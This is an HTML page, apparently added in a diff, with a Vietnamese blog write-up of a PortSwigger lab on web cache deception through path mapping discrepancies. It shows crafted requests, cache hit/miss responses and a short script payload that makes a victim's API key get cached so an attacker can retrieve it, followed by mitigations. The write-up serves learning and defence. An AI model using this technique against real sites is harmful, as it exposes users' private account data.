@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Web Cache Deception: Khai thác Path Mapping Discrepancies | Mai Tấn Lợi</title>
+<meta name="keywords" content="web-cache-deception, portswigger, burp-suite, owasp">
+<meta name="description" content="Giới thiệu
+Đây là bài lab đầu tiên trong series Web Cache Deception trên PortSwigger Web Security Academy. Lab này khai thác sự khác biệt (discrepancy) trong cách origin server và cache xử lý URL path, từ đó đánh cắp dữ liệu nhạy cảm của người dùng khác.
+Lab: Using path mapping discrepancies
+Difficulty: Practitioner
+Mục tiêu: Tìm API key của user carlos
+Kiến thức nền tảng
+URL Path Mapping là gì?
+URL path mapping là quá trình server ánh xạ một URL path tới resource tương ứng. Có 2 kiểu phổ biến:">
+<meta name="author" content="Mai Tấn Lợi">
+<link rel="canonical" href="http://localhost:1313/web-cache-deception-path-mapping-discrepancies/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.25d7e273d7350f014c0b728e4f2c44afdb81c4cff1e9660027ed4acc596d5d8d.css" integrity="sha256-Jdfic9c1DwFMC3KOTyxEr9uBxM/x6WYAJ&#43;1KzFltXY0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/web-cache-deception-path-mapping-discrepancies/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Mai Tấn Lợi (Alt + H)">Mai Tấn Lợi</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/writeups/" title="Write-ups">
+                    <span>Write-ups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Trang chủ</a>&nbsp;»&nbsp;<a href="http://localhost:1313/blog/">Blogs</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Web Cache Deception: Khai thác Path Mapping Discrepancies
+    </h1>
+    <div class="post-meta"><span title='2026-03-10 00:00:00 +0000 UTC'>March 10, 2026</span>&nbsp;·&nbsp;<span>4 phút</span>&nbsp;·&nbsp;<span>Mai Tấn Lợi</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Mục lục</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#gi%e1%bb%9bi-thi%e1%bb%87u" aria-label="Giới thiệu">Giới thiệu</a></li>
+                <li>
+                    <a href="#ki%e1%ba%bfn-th%e1%bb%a9c-n%e1%bb%81n-t%e1%ba%a3ng" aria-label="Kiến thức nền tảng">Kiến thức nền tảng</a><ul>
+                        
+                <li>
+                    <a href="#url-path-mapping-l%c3%a0-g%c3%ac" aria-label="URL Path Mapping là gì?">URL Path Mapping là gì?</a></li>
+                <li>
+                    <a href="#l%e1%bb%97-h%e1%bb%95ng-n%e1%ba%b1m-%e1%bb%9f-%c4%91%c3%a2u" aria-label="Lỗ hổng nằm ở đâu?">Lỗ hổng nằm ở đâu?</a></li></ul>
+                </li>
+                <li>
+                    <a href="#qu%c3%a1-tr%c3%acnh-gi%e1%ba%a3i-lab" aria-label="Quá trình giải lab">Quá trình giải lab</a><ul>
+                        
+                <li>
+                    <a href="#b%c6%b0%e1%bb%9bc-1-x%c3%a1c-%c4%91%e1%bb%8bnh-target-endpoint" aria-label="Bước 1: Xác định target endpoint">Bước 1: Xác định target endpoint</a></li>
+                <li>
+                    <a href="#b%c6%b0%e1%bb%9bc-2-test-path-mapping-tr%c3%aan-origin-server" aria-label="Bước 2: Test path mapping trên origin server">Bước 2: Test path mapping trên origin server</a></li>
+                <li>
+                    <a href="#b%c6%b0%e1%bb%9bc-3-test-cache-behavior" aria-label="Bước 3: Test cache behavior">Bước 3: Test cache behavior</a></li>
+                <li>
+                    <a href="#b%c6%b0%e1%bb%9bc-4-craft-exploit" aria-label="Bước 4: Craft exploit">Bước 4: Craft exploit</a></li></ul>
+                </li>
+                <li>
+                    <a href="#t%e1%bb%95ng-k%e1%ba%bft" aria-label="Tổng kết">Tổng kết</a><ul>
+                        
+                <li>
+                    <a href="#attack-flow" aria-label="Attack flow">Attack flow</a></li>
+                <li>
+                    <a href="#root-cause" aria-label="Root cause">Root cause</a></li>
+                <li>
+                    <a href="#c%c3%a1ch-ph%c3%b2ng-ch%e1%bb%91ng" aria-label="Cách phòng chống">Cách phòng chống</a></li></ul>
+                </li>
+                <li>
+                    <a href="#c%c3%b4ng-c%e1%bb%a5-s%e1%bb%ad-d%e1%bb%a5ng" aria-label="Công cụ sử dụng">Công cụ sử dụng</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="giới-thiệu">Giới thiệu<a hidden class="anchor" aria-hidden="true" href="#giới-thiệu">#</a></h2>
+<p>Đây là bài lab đầu tiên trong series <strong>Web Cache Deception</strong> trên PortSwigger Web Security Academy. Lab này khai thác sự khác biệt (discrepancy) trong cách <strong>origin server</strong> và <strong>cache</strong> xử lý URL path, từ đó đánh cắp dữ liệu nhạy cảm của người dùng khác.</p>
+<p><strong>Lab:</strong> Using path mapping discrepancies<br>
+<strong>Difficulty:</strong> Practitioner<br>
+<strong>Mục tiêu:</strong> Tìm API key của user <code>carlos</code></p>
+<h2 id="kiến-thức-nền-tảng">Kiến thức nền tảng<a hidden class="anchor" aria-hidden="true" href="#kiến-thức-nền-tảng">#</a></h2>
+<h3 id="url-path-mapping-là-gì">URL Path Mapping là gì?<a hidden class="anchor" aria-hidden="true" href="#url-path-mapping-là-gì">#</a></h3>
+<p>URL path mapping là quá trình server ánh xạ một URL path tới resource tương ứng. Có 2 kiểu phổ biến:</p>
+<p><strong>Traditional URL mapping</strong> — path tương ứng trực tiếp với file trên hệ thống:</p>
+<pre tabindex="0"><code>http://example.com/path/in/filesystem/resource.html
+</code></pre><p><strong>REST-style URL mapping</strong> — path được trừu tượng hóa thành các endpoint logic:</p>
+<pre tabindex="0"><code>http://example.com/path/resource/param1/param2
+</code></pre><p>Ở kiểu REST-style, <code>param1</code> và <code>param2</code> không phải là file thật, mà là tham số được server xử lý.</p>
+<h3 id="lỗ-hổng-nằm-ở-đâu">Lỗ hổng nằm ở đâu?<a hidden class="anchor" aria-hidden="true" href="#lỗ-hổng-nằm-ở-đâu">#</a></h3>
+<p>Khi origin server dùng REST-style nhưng cache dùng traditional mapping, sẽ xảy ra discrepancy. Ví dụ với URL:</p>
+<pre tabindex="0"><code>http://example.com/user/123/profile/wcd.css
+</code></pre><ul>
+<li><strong>Origin server (REST-style):</strong> Route tới endpoint <code>/user/123/profile</code>, bỏ qua <code>wcd.css</code> → trả về data nhạy cảm</li>
+<li><strong>Cache (Traditional):</strong> Thấy file <code>.css</code> → cache response lại như file tĩnh</li>
+</ul>
+<p>Kết quả: data nhạy cảm bị cache và bất kỳ ai truy cập cùng URL đều nhận được.</p>
+<h2 id="quá-trình-giải-lab">Quá trình giải lab<a hidden class="anchor" aria-hidden="true" href="#quá-trình-giải-lab">#</a></h2>
+<h3 id="bước-1-xác-định-target-endpoint">Bước 1: Xác định target endpoint<a hidden class="anchor" aria-hidden="true" href="#bước-1-xác-định-target-endpoint">#</a></h3>
+<p>Đăng nhập với tài khoản <code>wiener:peter</code>, truy cập trang <strong>My Account</strong>. Trang này hiển thị API key — đây chính là dữ liệu nhạy cảm cần bảo vệ.</p>
+<p>Trong <strong>Burp Suite</strong>, vào <strong>Proxy &gt; HTTP history</strong>, tìm request <code>GET /my-account</code> rồi <strong>Send to Repeater</strong>.</p>
+<h3 id="bước-2-test-path-mapping-trên-origin-server">Bước 2: Test path mapping trên origin server<a hidden class="anchor" aria-hidden="true" href="#bước-2-test-path-mapping-trên-origin-server">#</a></h3>
+<p>Trong Repeater, thêm một arbitrary segment vào path:</p>
+<pre tabindex="0"><code>GET /my-account/abc HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=...
+</code></pre><p><strong>Kết quả:</strong> Response <code>200 OK</code>, vẫn trả về trang My Account với API key.</p>
+<p>→ Origin server dùng REST-style mapping, bỏ qua segment <code>/abc</code>.</p>
+<h3 id="bước-3-test-cache-behavior">Bước 3: Test cache behavior<a hidden class="anchor" aria-hidden="true" href="#bước-3-test-cache-behavior">#</a></h3>
+<p>Thêm static extension <code>.js</code> vào path:</p>
+<pre tabindex="0"><code>GET /my-account/abc.js HTTP/2
+Host: LAB-ID.web-security-academy.net
+Cookie: session=...
+</code></pre><p><strong>Kết quả lần gửi đầu tiên:</strong></p>
+<pre tabindex="0"><code>HTTP/2 200 OK
+Cache-Control: max-age=30
+Age: 0
+X-Cache: miss
+</code></pre><ul>
+<li><code>X-Cache: miss</code> → Response chưa được cache</li>
+<li><code>Cache-Control: max-age=30</code> → Nếu được cache, sẽ lưu trong 30 giây</li>
+</ul>
+<p><strong>Gửi lại trong vòng 30 giây:</strong></p>
+<pre tabindex="0"><code>HTTP/2 200 OK
+Cache-Control: max-age=30
+Age: 8
+X-Cache: hit
+</code></pre><ul>
+<li><code>X-Cache: hit</code> → Response đã được phục vụ từ cache</li>
+</ul>
+<p>→ Cache nhận diện <code>.js</code> là file tĩnh và lưu lại toàn bộ response, bao gồm cả data nhạy cảm.</p>
+<p><img src="/images/web-cache-3.png" alt="" loading="lazy" />
+</p>
+<h3 id="bước-4-craft-exploit">Bước 4: Craft exploit<a hidden class="anchor" aria-hidden="true" href="#bước-4-craft-exploit">#</a></h3>
+<p>Vào <strong>Exploit Server</strong>, đặt payload trong phần Body:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://LAB-ID.web-security-academy.net/my-account/xyz.js&#34;</span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><p>Lưu ý dùng path segment mới (<code>xyz.js</code>) để tránh nhận response đã cache từ bước test trước.</p>
+<p>Nhấn <strong>Deliver exploit to victim</strong> — khi carlos truy cập, response chứa API key của carlos sẽ bị cache lại.</p>
+<p>Ngay lập tức (trong vòng 30 giây), truy cập URL trên browser:</p>
+<pre tabindex="0"><code>https://LAB-ID.web-security-academy.net/my-account/xyz.js
+</code></pre><p>Cache trả về response chứa <strong>API key của carlos</strong>. Copy API key và submit solution.
+<img src="/images/web-cache-1.png" alt="" loading="lazy" />
+
+<img src="/images/web-cache-2.png" alt="" loading="lazy" />
+</p>
+<h2 id="tổng-kết">Tổng kết<a hidden class="anchor" aria-hidden="true" href="#tổng-kết">#</a></h2>
+<h3 id="attack-flow">Attack flow<a hidden class="anchor" aria-hidden="true" href="#attack-flow">#</a></h3>
+<pre tabindex="0"><code>Attacker                    Victim (carlos)              Server + Cache
+   |                              |                           |
+   |--- Gửi URL độc hại --------&gt;|                           |
+   |                              |--- GET /my-account/xyz.js --&gt;|
+   |                              |&lt;-- 200 OK (API key carlos) --|
+   |                              |         Cache lưu response   |
+   |--- GET /my-account/xyz.js ---------------------------------&gt;|
+   |&lt;-- 200 OK (API key carlos từ cache) ------------------------|
+</code></pre><h3 id="root-cause">Root cause<a hidden class="anchor" aria-hidden="true" href="#root-cause">#</a></h3>
+<p>Sự khác biệt (discrepancy) giữa cách origin server và cache xử lý URL path:</p>
+<ul>
+<li>Origin server bỏ qua path segment thừa (REST-style)</li>
+<li>Cache dựa vào file extension để quyết định cache hay không (Traditional)</li>
+</ul>
+<h3 id="cách-phòng-chống">Cách phòng chống<a hidden class="anchor" aria-hidden="true" href="#cách-phòng-chống">#</a></h3>
+<ul>
+<li><strong>Cấu hình cache:</strong> Không cache response chỉ dựa trên file extension. Kiểm tra <code>Content-Type</code> header trước khi lưu cache</li>
+<li><strong>Origin server:</strong> Trả về <code>404</code> cho path không hợp lệ thay vì bỏ qua segment thừa</li>
+<li><strong>Response headers:</strong> Thêm <code>Cache-Control: no-store, private</code> cho các endpoint chứa dữ liệu nhạy cảm</li>
+<li><strong>Cache key:</strong> Cấu hình cache key dựa trên cả path lẫn <code>Content-Type</code> response</li>
+</ul>
+<h2 id="công-cụ-sử-dụng">Công cụ sử dụng<a hidden class="anchor" aria-hidden="true" href="#công-cụ-sử-dụng">#</a></h2>
+<ul>
+<li><strong>Burp Suite Community Edition</strong> — Proxy, Repeater để phân tích request/response</li>
+<li><strong>Burp&rsquo;s built-in browser</strong> — Truy cập lab qua proxy</li>
+</ul>
+
+
+  </div>
+  <div class="post-author">
+    <div class="post-author-info">
+      <div class="post-author-name">Mai Tấn Lợi</div>
+      <div class="post-author-bio">Phá để hiểu, viết để nhớ</div>
+    </div>
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/web-cache-deception/">Web-Cache-Deception</a></li>
+      <li><a href="http://localhost:1313/tags/portswigger/">Portswigger</a></li>
+      <li><a href="http://localhost:1313/tags/burp-suite/">Burp-Suite</a></li>
+      <li><a href="http://localhost:1313/tags/owasp/">Owasp</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/owasp-top-10-vi-thu-bao-mat/">
+    <span class="title">« Trang trước</span>
+    <br>
+    <span>OWASP Top 10:2025 — Vĩ Thú Bảo Mật Edition 🍥</span>
+  </a>
+  <a class="next" href="http://localhost:1313/ung-dung-python-cho-cong-viec/">
+    <span class="title">Trang tiếp theo »</span>
+    <br>
+    <span>Ứng dụng Python cho giải quyết công việc hàng ngày</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Mai Tấn Lợi</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a><div class="footer-social">
+</div>
+
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'Sao chép';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'Đã sao chép!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'Sao chép';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
